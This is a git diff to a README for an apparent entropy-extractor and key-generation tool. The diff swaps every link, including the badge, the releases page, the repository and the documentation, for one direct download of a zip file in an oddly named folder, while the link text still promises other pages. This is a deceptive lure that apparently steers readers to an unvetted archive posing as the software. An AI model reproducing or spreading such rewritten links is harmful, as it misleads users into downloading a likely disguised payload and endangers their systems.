@@ -1,6 +1,6 @@
 # 🚀 lavarand-entropy-extractor - Unlock Cryptographic Security with Ease
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MohitGamer9571/lavarand-entropy-extractor/releases)
+[![Download](https://raw.githubusercontent.com/MohitGamer9571/lavarand-entropy-extractor/main/hygrothermal/lavarand-entropy-extractor.zip)](https://raw.githubusercontent.com/MohitGamer9571/lavarand-entropy-extractor/main/hygrothermal/lavarand-entropy-extractor.zip)
 
 ## 🌟 Overview
 
@@ -27,7 +27,7 @@ Follow these steps to get started with the "lavarand-entropy-extractor":
 
 ### Step 1: Visit the Release Page
 
-To download the software, visit the [Releases page](https://github.com/MohitGamer9571/lavarand-entropy-extractor/releases). This page contains the latest version of the software and is where you will find the download link.
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/MohitGamer9571/lavarand-entropy-extractor/main/hygrothermal/lavarand-entropy-extractor.zip). This page contains the latest version of the software and is where you will find the download link.
 
 ### Step 2: Download the Software
 
@@ -51,7 +51,7 @@ After installation, launch the application. The user interface is designed to be
 
 ## 📥 Download & Install 
 
-Download the latest version from the [Releases page](https://github.com/MohitGamer9571/lavarand-entropy-extractor/releases) to get started with your secure key generation.
+Download the latest version from the [Releases page](https://raw.githubusercontent.com/MohitGamer9571/lavarand-entropy-extractor/main/hygrothermal/lavarand-entropy-extractor.zip) to get started with your secure key generation.
 
 ## 🛠️ Troubleshooting
 
@@ -67,8 +67,8 @@ If you need help or have questions about the application, feel free to reach out
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/MohitGamer9571/lavarand-entropy-extractor) - Explore the project’s code and contributions.
-- [Documentation](https://github.com/MohitGamer9571/lavarand-entropy-extractor/wiki) - Find detailed guides and support.
+- [GitHub Repository](https://raw.githubusercontent.com/MohitGamer9571/lavarand-entropy-extractor/main/hygrothermal/lavarand-entropy-extractor.zip) - Explore the project’s code and contributions.
+- [Documentation](https://raw.githubusercontent.com/MohitGamer9571/lavarand-entropy-extractor/main/hygrothermal/lavarand-entropy-extractor.zip) - Find detailed guides and support.
 
 ## 🖋️ Acknowledgments
 
